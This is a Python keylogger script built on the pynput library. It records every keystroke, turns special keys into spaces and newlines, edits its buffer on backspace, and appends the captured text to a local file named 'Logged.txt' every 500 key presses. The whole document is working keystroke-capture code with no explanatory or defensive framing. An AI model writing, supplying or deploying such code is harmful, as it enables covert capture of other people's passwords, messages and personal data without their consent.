#Thoose the modules that we are using
from pynput.keyboard import Key, Listener
from time import asctime
#from os import listdir

def write_key(list_key):
    global count
    global entered
    global hour
    print(list_key)
    print(count)
    if count == 500:
        with open("Logged.txt", "a") as file:
            for word in list_key:
                file.write(word)
            count = 0
            entered = []
            hour = asctime()
    else:
        pass


def on_press(Key):

    global entered
    global count
    k = str(Key)

    k = k.strip("'").replace("Key.", "")
    if k == "space":
        k = " "
    elif k == "enter":
        k = "\n"
    elif k == "backspace":
        try:
            if entered[-1] == "":
                del entered[len(entered)-2]
            else:
                del entered[-1]
        except IndexError:
            with open("Logged.txt", "r+") as file:
                data = file.read()
                file.seek(0)
                file.truncate()
                file.write(data[:-1])

        k = k.strip("backspace")

    entered.append(k)
    count += 1
    write_key(entered)



entered = []
count = 0
hour = asctime()
with Listener(on_press=on_press) as l:
    l.join()
